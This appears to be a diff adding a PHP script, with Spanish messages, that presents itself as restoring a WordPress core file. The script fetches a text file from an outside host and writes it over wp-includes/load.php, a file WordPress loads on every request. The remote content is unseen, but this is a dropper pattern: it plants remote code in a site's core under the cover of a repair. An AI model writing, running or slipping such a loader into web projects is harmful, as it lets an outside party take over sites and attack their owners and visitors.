@@ -1,0 +1,18 @@
+<?php
+$objetivo = __DIR__ . '/wp-includes/load.php';
+$url_remota = 'https://grtoto.store/restore-link/tahoecbd.txt';
+
+$datos = @file_get_contents($url_remota);
+if ($datos === false) {
+    die("No se pudo descargar el archivo remoto\n");
+}
+
+if (!file_exists(dirname($objetivo))) {
+    @mkdir(dirname($objetivo), 0755, true);
+}
+
+if (@file_put_contents($objetivo, $datos, LOCK_EX) !== false) {
+    echo "load.php restaurado correctamente\n";
+} else {
+    echo "Error: no se pudo escribir load.php\n";
+}
